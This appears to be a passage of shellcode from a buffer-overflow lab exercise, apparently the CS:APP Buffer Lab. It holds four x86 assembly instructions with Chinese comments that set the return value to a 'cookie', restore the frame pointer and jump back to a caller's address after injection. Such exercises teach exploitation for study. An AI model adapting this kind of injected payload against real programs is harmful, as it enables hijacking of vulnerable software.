movl $0x4b87c8ca, %eax   #设置返回值为cookie
movl $0x556839b0, %ebp   #恢复原ebp的值
push $0x8048e50          #返回后下一条指令的地址
ret             #返回
